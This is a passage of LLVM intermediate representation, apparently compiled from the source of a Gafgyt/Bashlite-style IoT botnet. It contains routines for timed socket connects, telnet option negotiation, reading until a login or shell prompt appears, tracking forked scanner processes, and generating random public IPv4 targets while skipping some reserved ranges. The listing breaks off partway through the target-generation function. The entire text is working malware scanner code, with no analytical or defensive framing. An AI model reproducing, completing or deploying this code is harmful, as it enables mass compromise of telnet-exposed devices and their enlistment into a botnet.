define dso_local i32 @connectTimeout(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 noundef %19, i32 noundef 3, i8* noundef null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 noundef %24, i32 noundef 4, i64 noundef %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 noundef zeroext %29) #15
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* noundef %32, %struct.in_addr* noundef %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 noundef %40, %struct.sockaddr* noundef %41, i32 noundef 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #15
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.__sigset_t* %11, %struct.__sigset_t** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.__sigset_t*, %struct.__sigset_t** %18, align 8
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !32

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 noundef %82, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %11, %struct.__sigset_t* noundef null, %struct.timeval* noundef %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 noundef %86, i32 noundef 1, i32 noundef 4, i8* noundef %87, i32* noundef %13) #12
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 noundef %98, i32 noundef 3, i8* noundef null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 noundef %103, i32 noundef 4, i64 noundef %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #8

declare i32 @connect(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 noundef %15) #12
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !33

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* noundef %44) #12
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @negotiate(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 noundef %15, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 noundef %57, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 noundef %59, i8* noundef %61, i64 noundef 1, i32 noundef 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @matchPrompt(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* noundef %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* noundef %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !34

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !35

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @readUntil(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i8* noundef %5, i32 noundef %6, i32 noundef %7) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

33:                                               ; preds = %142, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

38:                                               ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

46:                                               ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

48:                                               ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %143

50:                                               ; preds = %48
  br label %51

51:                                               ; preds = %50
  store %struct.__sigset_t* %21, %struct.__sigset_t** %25, align 8
  store i32 0, i32* %24, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %24, align 4
  %54 = zext i32 %53 to i64
  %55 = icmp ult i64 %54, 16
  br i1 %55, label %56, label %65

56:                                               ; preds = %52
  %57 = load %struct.__sigset_t*, %struct.__sigset_t** %25, align 8
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %57, i32 0, i32 0
  %59 = load i32, i32* %24, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 %60
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %56
  %63 = load i32, i32* %24, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %24, align 4
  br label %52, !llvm.loop !36

65:                                               ; preds = %52
  br label %66

66:                                               ; preds = %65
  %67 = load i32, i32* %10, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %72 = load i32, i32* %10, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 noundef %79, %struct.__sigset_t* noundef %21, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef null, %struct.timeval* noundef %22)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %82, label %83

82:                                               ; preds = %66
  br label %143

83:                                               ; preds = %66
  %84 = load i8*, i8** %15, align 8
  %85 = load i32, i32* %18, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8* %87, i8** %23, align 8
  %88 = load i32, i32* %10, align 4
  %89 = load i8*, i8** %23, align 8
  %90 = call i64 @recv(i32 noundef %88, i8* noundef %89, i64 noundef 1, i32 noundef 0)
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %97, label %94

94:                                               ; preds = %83
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %94, %83
  store i32 0, i32* %9, align 4
  br label %148

98:                                               ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %18, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 255
  br i1 %105, label %106, label %128

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = call i64 @recv(i32 noundef %107, i8* noundef %109, i64 noundef 2, i32 noundef 0)
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %117, label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %114, %106
  store i32 0, i32* %9, align 4
  br label %148

118:                                              ; preds = %114
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %18, align 4
  %121 = add nsw i32 %120, %119
  store i32 %121, i32* %18, align 4
  %122 = load i32, i32* %10, align 4
  %123 = load i8*, i8** %23, align 8
  %124 = call i32 @negotiate(i32 noundef %122, i8* noundef %123, i32 noundef 3)
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %127, label %126

126:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %148

127:                                              ; preds = %118
  br label %142

128:                                              ; preds = %98
  %129 = load i8*, i8** %15, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = call i8* @strstr(i8* noundef %129, i8* noundef %130) #11
  %132 = icmp ne i8* %131, null
  br i1 %132, label %140, label %133

133:                                              ; preds = %128
  %134 = load i32, i32* %12, align 4
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = load i8*, i8** %15, align 8
  %138 = call i32 @matchPrompt(i8* noundef %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %136, %128
  store i32 1, i32* %20, align 4
  br label %143

141:                                              ; preds = %136, %133
  br label %142

142:                                              ; preds = %141, %127
  br label %33, !llvm.loop !37

143:                                              ; preds = %140, %82, %48
  %144 = load i32, i32* %20, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %147

146:                                              ; preds = %143
  store i32 1, i32* %9, align 4
  br label %148

147:                                              ; preds = %143
  store i32 0, i32* %9, align 4
  br label %148

148:                                              ; preds = %147, %146, %126, %117, %97
  %149 = load i32, i32* %9, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp slt i32 %5, 255
  br i1 %6, label %7, label %40

7:                                                ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %40

11:                                               ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %13 = zext i8 %12 to i32
  %14 = icmp slt i32 %13, 255
  br i1 %14, label %15, label %40

15:                                               ; preds = %11
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %17 = zext i8 %16 to i32
  %18 = icmp slt i32 %17, 255
  br i1 %18, label %19, label %40

19:                                               ; preds = %15
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %21 = add i8 %20, 1
  store i8 %21, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %23 = add i8 %22, 1
  store i8 %23, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %25 = add i8 %24, 1
  store i8 %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %26 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %27 = add i8 %26, 1
  store i8 %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %28 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %29 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %30 = zext i8 %29 to i32
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %36 = zext i8 %35 to i32
  %37 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %28, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 noundef %30, i32 noundef %32, i32 noundef %34, i32 noundef %36)
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %39 = call i32 @inet_addr(i8* noundef %38) #12
  store i32 %39, i32* %1, align 4
  br label %197

40:                                               ; preds = %15, %11, %7, %0
  %41 = call i32 @rand() #12
  %42 = srem i32 %41, 255
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %44 = call i32 @rand() #12
  %45 = srem i32 %44, 255
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %47 = call i32 @rand() #12
  %48 = srem i32 %47, 255
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %50 = call i32 @rand() #12
  %51 = srem i32 %50, 255
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %53

53:                                               ; preds = %171, %40
  %54 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %169, label %57

57:                                               ; preds = %53
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br i1 %60, label %169, label %61

61:                                               ; preds = %57
